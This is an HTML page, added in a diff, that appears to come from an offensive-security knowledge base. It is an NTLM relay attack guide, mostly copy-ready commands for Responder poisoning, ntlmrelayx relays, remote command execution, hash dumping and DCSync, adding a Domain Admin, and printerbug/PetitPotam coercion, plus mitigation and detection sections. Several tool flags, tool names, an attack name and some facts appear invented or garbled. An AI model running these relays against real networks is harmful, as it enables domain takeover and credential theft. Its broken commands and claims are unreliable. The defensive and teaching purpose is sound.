@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>NTLM Relay | Saikumar Infosec</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../core/styles/core.css">
+  <style>
+    .page-header { padding: 4rem 0 2rem; }
+    .breadcrumb { margin-bottom: 1rem; color: var(--text-secondary); font-size: 0.85rem; display: flex; gap: 0.5rem; flex-wrap: wrap; }
+    .breadcrumb a { color: var(--primary); text-decoration: none; }
+    .severity-badge { display: inline-block; padding: 0.5rem 1rem; border-radius: 40px; font-size: 0.75rem; font-weight: 600; margin-bottom: 1rem; }
+    .severity-critical { background: rgba(255,68,68,0.2); color: #ff4444; }
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1.5rem 0; padding: 1rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; }
+    .meta-item { padding: 0.5rem; }
+    .meta-item strong { display: block; color: var(--primary); margin-bottom: 0.25rem; font-size: 0.7rem; text-transform: uppercase; }
+    .meta-item span { color: var(--text-secondary); font-size: 0.85rem; }
+    .content-section { margin: 2rem 0; }
+    .content-section h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--primary); border-left: 3px solid var(--primary); padding-left: 1rem; font-weight: 600; }
+    .content-section p { margin: 0.75rem 0; color: var(--text-secondary); line-height: 1.7; }
+    .content-section ul, .content-section ol { margin: 1rem 0; padding-left: 1.5rem; color: var(--text-secondary); }
+    .content-section li { margin: 0.5rem 0; line-height: 1.6; }
+    .content-section code { background: var(--bg-elevated); padding: 2px 6px; border-radius: 4px; color: var(--primary); font-family: 'Courier New', monospace; font-size: 0.9em; }
+    .code-block { background: var(--bg-card); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.2rem; margin: 1.5rem 0; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 0.8rem; color: var(--primary); position: relative; }
+    .code-block pre { margin: 0; white-space: pre-wrap; word-wrap: break-word; }
+    .copy-btn { position: absolute; top: 0.5rem; right: 0.5rem; background: var(--bg-elevated); border: 1px solid var(--border); padding: 0.4rem 0.8rem; border-radius: 4px; cursor: pointer; color: var(--text-secondary); font-size: 0.75rem; transition: var(--transition); }
+    .copy-btn:hover { color: var(--primary); background: var(--bg-card); }
+    .back-link { display: inline-flex; align-items: center; gap: 0.5rem; margin-top: 2rem; color: var(--primary); text-decoration: none; }
+    .back-link:hover { text-decoration: underline; }
+    .vulnerability-box { background: rgba(255,68,68,0.1); border-left: 4px solid #ff4444; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .vulnerability-box strong { color: #ff4444; }
+    .mitigation-box { background: rgba(0,245,160,0.1); border-left: 4px solid var(--primary); padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .mitigation-box strong { color: var(--primary); }
+    .info-box { background: rgba(79,140,255,0.1); border-left: 4px solid #4f8cff; padding: 1rem; border-radius: 0.5rem; margin: 1rem 0; }
+    .info-box strong { color: #4f8cff; }
+    @media (max-width: 768px) { .meta-grid { grid-template-columns: 1fr; } }
+  </style>
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="container nav-flex">
+    <a href="../index.html" class="logo">Saikumar<span>.Infosec</span></a>
+    <button class="mobile-menu" id="mobileMenuBtn"><i class="fas fa-bars"></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="../index.html">Home</a></li>
+      <li><a href="index.html">Active Directory</a></li>
+      <li><a href="../index.html#contact">Contact</a></li>
+      <li><button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i> <span>Dark</span></button></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="../index.html">Home</a> / <a href="index.html">Active Directory</a> / NTLM Relay
+    </div>
+
+    <div class="page-header">
+      <span class="severity-badge severity-critical"><i class="fas fa-exclamation-triangle"></i> Critical Severity | T1557</span>
+      <h1>🔄 NTLM Relay Attacks</h1>
+      
+      <div class="meta-grid">
+        <div class="meta-item"><strong>MITRE</strong><span>T1557</span></div>
+        <div class="meta-item"><strong>Platform</strong><span>Windows AD</span></div>
+        <div class="meta-item"><strong>Phase</strong><span>Lateral Movement</span></div>
+        <div class="meta-item"><strong>Difficulty</strong><span>Medium</span></div>
+      </div>
+    </div>
+
+    <!-- 1. DESCRIPTION -->
+    <div class="content-section" id="description">
+      <h2>🧠 Description</h2>
+      <p>NTLM Relay (also called NTLM middleman attack) is a technique where an attacker intercepts NTLM authentication attempts and relays them to a target service. This allows the attacker to authenticate as the victim user without needing their password hash.</p>
+      
+      <div class="vulnerability-box">
+        <strong>Why NTLM Relay Works:</strong>
+        <ul>
+          <li><strong>Challenge-Response:</strong> NTLM uses challenge-response, hash can be relayed</li>
+          <li><strong>No Server Verification:</strong> Standard NTLM doesn't verify target</li>
+          <li><strong>Auto-Auth:</strong> Many apps automatically attempt NTLM auth</li>
+          <li><strong>Legacy Compatibility:</strong> SMB, HTTP, LDAP all support NTLM</li>
+          <li><strong>Cross-Site:</strong> Can relay between different protocols</li>
+        </ul>
+      </div>
+
+      <p><strong>Attack Flow:</strong></p>
+      <ol>
+        <li>Attacker positions between client and server</li>
+        <li>Victim authenticates to attacker (captures Net-NTLM hash)</li>
+        <li>Attacker relays authentication to target server</li>
+        <li>Target server grants access based on victim's credentials</li>
+      </ol>
+    </div>
+
+    <!-- 2. RELAY SETUP -->
+    <div class="content-section" id="setup">
+      <h2>⚙️ Relay Setup</h2>
+      
+      <p><strong>Responder Configuration:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Edit Responder.conf
+[Responder Core]
+; Set SMB to Off to avoid cracking
+SMB = Off
+
+; Set HTTP to On
+HTTP = On
+
+; Set to challenge all auth attempts
+Challenge = 112233445566778899
+
+# Run Responder
+python3 Responder.py -I eth0 -v
+
+# Use SMBv1 only to catch more
+python3 Responder.py -I eth0 --lm
+
+# Or with NTLM relay mode
+python3 Responder.py -I eth0 -r</pre>
+      </div>
+
+      <p><strong>ntlmrelayx.py (Impacket):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Relay to specific targets
+python3 ntlmrelayx.py -t 10.10.10.100 -smb2support
+
+# Relay to multiple targets
+python3 ntlmrelayx.py -tf targets.txt -smb2support
+
+# Relay with SOCKS proxy (multi-relay)
+python3 ntlmrelayx.py -tf targets.txt -smb2support - socks
+
+# Auto-execute commands on relay
+python3 ntlmrelayx.py -t 10.10.10.100 -smb2support -c "whoami"
+
+# Use protocol downgrade
+python3 ntlmrelayx.py -t target --smb2support --http-method wsman</pre>
+      </div>
+
+      <p><strong>Combined Attack (Responder + ntlmrelayx):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Terminal 1: Run Responder (SMB off to let ntlmrelayx handle it)
+python3 Responder.py -I eth0 -v
+
+# Terminal 2: Run ntlmrelayx
+python3 ntlmrelayx.py -tf targets.txt -smb2support
+
+# Or use MultiRelay.py (all-in-one)
+python3 MultiRelay.py -t 10.10.10.100 -dump</pre>
+      </div>
+    </div>
+
+    <!-- 3. TARGET SELECTION -->
+    <div class="content-section" id="targets">
+      <h2>🎯 Target Selection</h2>
+      
+      <p><strong>High-Value Targets:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Domain Controllers (SMB)
+# - Dump SAM/SYSTEM
+# - DCSync for all hashes
+# - Add new domain admin
+
+# File Servers (SMB)
+# - Access to sensitive files
+# - Pivot for more credentials
+
+# Exchange Servers (HTTP/EWS)
+# - Read emails
+# - Send as any user
+# - Calendar access
+
+# Web Applications (HTTP)
+# - Session hijacking
+# - Access to sensitive data
+
+# LDAP (domain controllers)
+# - ACL modification
+# - New user creation
+# - Group membership changes</pre>
+      </div>
+
+      <p><strong>Enumerate Active Sessions (SMB):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Find machines with SMB signing disabled (vulnerable to relay)
+nmap --script smb-security-mode.nse -p 445 10.10.10.0/24
+
+# Or with CrackMapExec
+crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
+
+# Check for signing requirements
+crackmapexec smb 10.10.10.100 --local-auth -M smb_signing</pre>
+      </div>
+
+      <p><strong>Target File:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Create targets.txt with specific hosts
+10.10.10.100
+10.10.10.101
+dc01.corp.com
+fileserver.corp.com
+
+# Or use LDAP to enumerate
+python3 ntlmrelayx.py -wh anonymous -wb 10.10.10.100 --enum-modifications</pre>
+      </div>
+    </div>
+
+    <!-- 4. EXPLOITATION -->
+    <div class="content-section" id="exploitation">
+      <h2>💣 Exploitation Techniques</h2>
+      
+      <p><strong>1. SMB to SMB (Lateral Movement):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Relay to SMB and execute commands
+python3 ntlmrelayx.py -t 10.10.10.100 -smb2support -c "whoami"
+
+# Dump hashes via SMB
+python3 ntlmrelayx.py -t 10.10.10.100 -smb2support -d
+
+# Use multi-relay to target all signing-disabled hosts
+python3 ntlmrelayx.py -tf targets.txt --smb2support --escalate-user attacker</pre>
+      </div>
+
+      <p><strong>2. HTTP to SMB (Web to Domain Admin):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Set up fake SMB server to capture and relay
+python3 ntlmrelayx.py -t dc01.corp.com -smb2support -c "whoami"
+
+# When victim browses to your HTTP server, relay to DC SMB</pre>
+      </div>
+
+      <p><strong>3. LDAP(S) Relay (ACL Abuse):</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Relay to LDAP (requires signing)
+python3 ntlmrelayx.py -t dc01.corp.com -ldap --escalate-user attacker
+
+# Add user to Domain Admins
+python3 ntlmrelayx.py -t dc01.corp.com -ldap -c "python3 -c 'import sys; sys.path.append(\".\"); from impacket.examples.utils import add_user; add_user(\"attacker\", \"Pass123!\")'"
+
+# Or use ACL attack module
+python3 ntlmrelayx.py -t dc01.corp.com -ldap --acl-add attacker</pre>
+      </div>
+
+      <p><strong>4. SMTP/IMAP Relay:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Relay to SMTP and send emails
+python3 ntlmrelayx.py -t mail.corp.com -smtp -c "send mail --to admin@corp.com --from victim@corp.com --body 'pwned'"
+
+# Or relay to IMAP
+python3 ntlmrelayx.py -t mail.corp.com -imap -d</pre>
+      </div>
+
+      <p><strong>5. Exchange EWS Attack:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Access Exchange Web Services
+python3 ntlmrelayx.py -t exchange.corp.com -ws --delegate-method all
+
+# Read emails as relayed user
+python3 ntlmrelayx.py -t exchange.corp.com -ews -d
+
+# Or use darkhound for EWS enumeration
+python3 darkhound.py -u attacker -p password -d corp.com --ews</pre>
+      </div>
+    </div>
+
+    <!-- 5. SMB RELAY SPECIFICS -->
+    <div class="content-section" id="smb-relay">
+      <h2>🔐 SMB Relay Details</h2>
+      
+      <p><strong>SMB Signing Check:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check if target requires signing
+nmap -p445 --script smb-security-mode.nse 10.10.10.100
+
+# If Message signing is disabled, it's vulnerable
+# If Message signing is enabled, relay will fail
+
+# CrackMapExec check
+crackmapexec smb 10.10.10.100 --local-auth
+
+# Check signing status</pre>
+      </div>
+
+      <p><strong>SMBEXEC-style Relay:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Relay and execute via SMB
+python3 ntlmrelayx.py -t 10.10.10.100 -smb2support -e payload.exe
+
+# Use existing SMB client
+python3 ntlmrelayx.py -t 10.10.10.100 -smb2support --exec-method smbexec -c "hostname"
+
+# Or use wmiexec for stealth
+python3 ntlmrelayx.py -t 10.10.10.100 -smb2support --exec-method wmiexec -c "hostname"</pre>
+      </div>
+
+      <p><strong>Hash Dumping via Relay:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Dump SAM from relay target
+python3 ntlmrelayx.py -t 10.10.10.100 -smb2support -d
+
+# DCSync via relay (if relayed user has replication rights)
+python3 ntlmrelayx.py -t dc01.corp.com -smb2support -d
+
+# Use secretsdump for comprehensive dump
+python3 ntlmrelayx.py -t dc01.corp.com -smb2support --enum-sessions
+python3 secretsdump.py -hashes :ntlmhash corp.com/attacker@dc01.corp.com</pre>
+      </div>
+    </div>
+
+    <!-- 6. SMBEVOOK ATTACK -->
+    <div class="content-section" id="smbevook">
+      <h2>🎭 SMBEvook Attack</h2>
+      
+      <p><strong>Authentication Coercion:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Use Printer Bug to coerce authentication
+# Works on most Windows servers by default
+
+# From Linux, use printerbug.py
+python3 printerbug.py corp.com/'attacker':password@printserver.corp.com 10.10.10.50
+
+# Or use MS-RPRN
+\\PATH\TO\msfrpc.py
+
+# This forces printserver to authenticate to attacker</pre>
+      </div>
+
+      <p><strong>SMBEvook + NTLM Relay:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Terminal 1: Start ntlmrelayx targeting DC
+python3 ntlmrelayx.py -t dc01.corp.com -smb2support -c "whoami"
+
+# Terminal 2: Coerce auth via printerbug
+python3 printerbug.py corp.com/'attacker':password@printserver.corp.com 10.10.10.50
+
+# Printserver will authenticate to attacker
+# NTLM relay will forward to DC
+# Gain code execution as printserver account on DC</pre>
+      </div>
+
+      <p><strong>PetitPotam Alternative:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Use PetitPotam for auth coercion
+python3 petitpotam.py -u attacker -p password -d corp.com -t dc01.corp.com 10.10.10.50
+
+# Combine with ntlmrelayx
+# Target will authenticate to your IP, relay to DC</pre>
+      </div>
+    </div>
+
+    <!-- 7. DEFENSE EVASION -->
+    <div class="content-section" id="defense-evasion">
+      <h2>🛡️ Defense Evasion</h2>
+      
+      <p><strong>NTLMv2 Downgrade:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If victim uses NTLMv1, convert to Net-NTLMv1
+# Then crack or relay
+
+# Use Responder to downgrade
+python3 Responder.py -I eth0 --lm
+
+# Or use ntlmrelayx with downgrade
+python3 ntlmrelayx.py -t target -smb2support --http-method ntlm_downgrade
+
+# Crack Net-NTLMv1 with hashcat
+hashcat -m 5500 hash.txt wordlist.txt
+
+# Or use John
+john --format=netntlm hash.txt</pre>
+      </div>
+
+      <p><strong>SMB Cross-Protocol Relay:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Relay from SMB to LDAP
+python3 ntlmrelayx.py -t dc01.corp.com -smb2support -ldap
+
+# Relay from HTTP to SMB
+python3 ntlmrelayx.py -t fileserver.corp.com -http --smb2support
+
+# Relay between domains (if trust exists)
+python3 ntlmrelayx.py -t target_domain_dc --smb2support</pre>
+      </div>
+    </div>
+
+    <!-- 8. IMPACT -->
+    <div class="content-section" id="impact">
+      <h2>💥 Impact</h2>
+      
+      <div class="vulnerability-box">
+        <strong>Potential Damage:</strong>
+        <ul>
+          <li><strong>Domain Admin:</strong> Relay to DC and execute commands as DA</li>
+          <li><strong>Hash Dumping:</strong> Get all user hashes via DCSync relay</li>
+          <li><strong>Email Access:</strong> Read all emails via Exchange relay</li>
+          <li><strong>ACL Modification:</strong> Give yourself any permissions</li>
+          <li><strong>File Access:</strong> Access any file share without credentials</li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- 9. MITIGATION -->
+    <div class="content-section" id="mitigation">
+      <h2>🛡️ Mitigation</h2>
+
+      <div class="mitigation-box">
+        <strong>✅ Primary Controls:</strong>
+        <ul>
+          <li><strong>Enable SMB Signing:</strong> Required on all workstations and servers</li>
+          <li><strong>Enable LDAP Signing:</strong> Require signing for LDAP traffic</li>
+          <li><strong>Disable NTLM:</strong> Use only Kerberos authentication</li>
+          <li><strong>Extended Protection for Authentication:</strong> Enable EPA</li>
+          <li><strong>Restrict NT LAN Manager:</strong> Deny NTLM at domain level</li>
+          <li><strong>Block outbound SMB:</strong> Prevent coerced authentication</li>
+        </ul>
+      </div>
+
+      <p><strong>Enable SMB Signing via Group Policy:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Computer Configuration > Policies > Windows Settings >
+# Security Options > Microsoft network client: Digitally sign communications (always)
+
+# Enable for all clients
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord
+
+# Enable for servers
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWord</pre>
+      </div>
+
+      <p><strong>Disable NTLM via Network Security:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Network security: Restrict NTLM
+# Computer Configuration > Policies > Windows Settings > Security Settings >
+# Local Policies > Security Options > Network security: Restrict NTLM
+
+# Set to "Deny for domain servers" or "Deny for all servers"
+gpupdate /force
+
+# Verify with nltmtest tool
+python3 ntlmrelayx.py --test</pre>
+      </div>
+
+      <p><strong>Block Printer Bug:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Disable Print Spooler service (if not needed)
+Stop-Service Spooler
+Set-Service -Name Spooler -StartupType Disabled
+
+# Or via GPO
+Computer Configuration > Policies > Windows Settings >
+Security Options > Interactive logon: Machine inactivity limit
+
+# Block outbound RPC traffic
+New-NetFirewallRule -DisplayName "Block RPC" -Direction Outbound -RemotePort 135,445 -Action Block</pre>
+      </div>
+    </div>
+
+    <!-- 10. DETECTION -->
+    <div class="content-section" id="detection">
+      <h2>🔍 Detection</h2>
+
+      <p><strong>Windows Event ID Monitoring:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Event ID 4624 - Account Logon (Type 3 = Network)
+# Event ID 4624 - Logon with NTLM (AuthenticationPackageName: NTLM)
+# Look for mismatched source IPs or unusual times
+
+# Detect SMB relay (Event ID 4624 with same source and target)
+Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | 
+    Where-Object { $_.Message -match 'NTLM' -and (source IP unusual) }</pre>
+      </div>
+
+      <p><strong>Network-Based Detection:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Monitor for:
+# - SMB connections from same source to multiple targets
+# - Unusual authentication patterns
+# - High volume of authentication failures
+# - Connections from workstations to other workstations (not servers)
+
+# Zeek/Suricata detection
+# Look for SMB2 signing negotiation followed by relaying pattern</pre>
+      </div>
+
+      <p><strong>Sysmon Configuration:</strong></p>
+      <div class="code-block">
+        <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Alert on suspicious network connections
+<Event>
+  <RuleGroup name="NTLM Relay Detection">
+    <NetworkConnect onmatch="include">
+      <DestinationPort condition="any">445,88,389,636</DestinationPort>
+      <DestinationHostname condition="contains">attacker</DestinationHostname>
+    </NetworkConnect>
+  </RuleGroup>
+</Event>
+
+# Alert on responder/multi-relay tools
+<ProcessCreate>
+  <Image condition="contains">responder</Image>
+  <Image condition="contains">ntlmrelayx</Image>
+  <Image condition="contains">multi-relay</Image>
+</ProcessCreate></pre>
+      </div>
+    </div>
+
+    <!-- 11. TOOLS -->
+    <div class="content-section" id="tools">
+      <h2>🛠️ Tools</h2>
+
+      <ul>
+        <li><strong>Responder:</strong> LLMNR/NBT-NS/mDNS poisoner</li>
+        <li><strong>ntlmrelayx (Impacket):</strong> NTLM relay with multiple targets</li>
+        <li><strong>MultiRelay.py:</strong> All-in-one SMB relay tool</li>
+        <li><strong>printerbug.py:</strong> Printer authentication coercion</li>
+        <li><strong>PetitPotam:</strong> MS-EFSR authentication coercion</li>
+        <li><strong>nmap (smb-security-mode):</strong> Check SMB signing status</li>
+      </ul>
+    </div>
+
+    <!-- 12. REFERENCES -->
+    <div class="content-section" id="references">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https:// byt3bl33d3r.medium.com/practical-guide-to-ntlm-relaying-in-2019-3045b0c54c0f" target="_blank">NTLM Relaying in 2019</a></li>
+        <li><a href="https:// blog.stealthbits.com/practical-ntlm-relaying/" target="_blank">Practical NTLM Relaying</a></li>
+        <li><a href="https://github.com/SecureAuthCorp/impacket" target="_blank">Impacket NTLMRelay</a></li>
+        <li><a href="https://github.com/lgandx/Responder" target="_blank">Responder</a></li>
+        <li><a href="https:// docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/restrict-ntlm-authentication-in-domain" target="_blank">MS NTLM Restrictions</a></li>
+      </ul>
+    </div>
+
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Active Directory</a>
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="container">
+    <p>Saikumar Raju | Offensive Security Knowledge Base</p>
+    <p>Always test in authorized environments only.</p>
+  </div>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const mobileBtn = document.getElementById('mobileMenuBtn');
+  const navLinks = document.getElementById('navLinks');
+  if (mobileBtn) {
+    mobileBtn.addEventListener('click', () => navLinks.classList.toggle('show'));
+  }
+  const themeToggle = document.getElementById('themeToggle');
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      document.body.classList.toggle('light');
+      const icon = themeToggle.querySelector('i');
+      const text = themeToggle.querySelector('span');
+      if (document.body.classList.contains('light')) {
+        icon.classList.remove('fa-moon');
+        icon.classList.add('fa-sun');
+        text.textContent = 'Light';
+      } else {
+        icon.classList.remove('fa-sun');
+        icon.classList.add('fa-moon');
+        text.textContent = 'Dark';
+      }
+      localStorage.setItem('theme-preference', document.body.classList.contains('light') ? 'light' : 'dark');
+    });
+  }
+  const savedTheme = localStorage.getItem('theme-preference');
+  if (savedTheme === 'light') document.body.classList.add('light');
+});
+
+function copyCode(btn) {
+  const code = btn.parentElement.querySelector('pre').innerText;
+  navigator.clipboard.writeText(code);
+  btn.textContent = 'Copied!';
+  setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+}
+</script>
+
+</body>
+</html>
